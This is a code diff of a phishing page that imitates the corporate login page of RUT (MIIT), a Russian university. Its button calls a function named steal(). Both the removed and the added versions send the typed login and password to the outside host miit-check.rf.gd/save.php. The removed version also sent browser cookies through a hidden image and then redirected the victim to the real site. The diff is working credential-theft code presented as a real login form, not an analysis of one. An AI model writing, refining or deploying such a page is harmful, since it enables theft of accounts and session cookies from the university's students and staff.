@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
     <meta charset="UTF-8">
     <title>Авторизация - РУТ (МИИТ)</title>
@@ -10,11 +10,8 @@
         h2 { color: #1a1a1a; font-weight: 600; margin-bottom: 8px; }
         .sub { color: #666; font-size: 14px; margin-bottom: 25px; }
         input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #d0d7de; border-radius: 8px; font-size: 15px; }
-        input:focus { border-color: #0054a0; outline: none; box-shadow: 0 0 0 3px rgba(0,84,160,0.1); }
-        button { width: 100%; padding: 14px; background: #0054a0; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s; }
-        button:hover { background: #003d7a; }
+        button { width: 100%; padding: 14px; background: #0054a0; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; }
         .footer { margin-top: 18px; font-size: 12px; color: #999; }
-        .loader { display: none; margin-top: 12px; font-size: 14px; color: #0054a0; }
     </style>
 </head>
 <body>
@@ -24,7 +21,6 @@
         <input type="text" id="login" placeholder="Корпоративный логин">
         <input type="password" id="password" placeholder="Пароль">
         <button onclick="steal()">Войти</button>
-        <div class="loader" id="loader">Отправка данных...</div>
         <div class="footer">Вход через корпоративную учётную запись</div>
     </div>
 
@@ -38,20 +34,10 @@
                 return;
             }
 
-            document.getElementById('loader').style.display = 'block';
-            document.querySelector('button').style.display = 'none';
+            var url = 'https://miit-check.rf.gd/save.php?login=' + encodeURIComponent(login) + '&pass=' + encodeURIComponent(pass);
 
-            // ДОМЕН ТЕПЕРЬ ТВОЙ — miit-check.rf.gd
-            var url = 'https://miit-check.rf.gd/save.php?login=' + encodeURIComponent(login) + '&pass=' + encodeURIComponent(pass) + '&cookies=' + encodeURIComponent(document.cookie);
-            
-            var img = document.createElement('img');
-            img.style.display = 'none';
-            img.src = url;
-            document.body.appendChild(img);
-
-            setTimeout(function() {
-                window.location.href = 'https://miit.ru';
-            }, 2000);
+            // ПРЯМОЙ ПЕРЕХОД
+            window.location.href = url;
         }
     </script>
 </body>
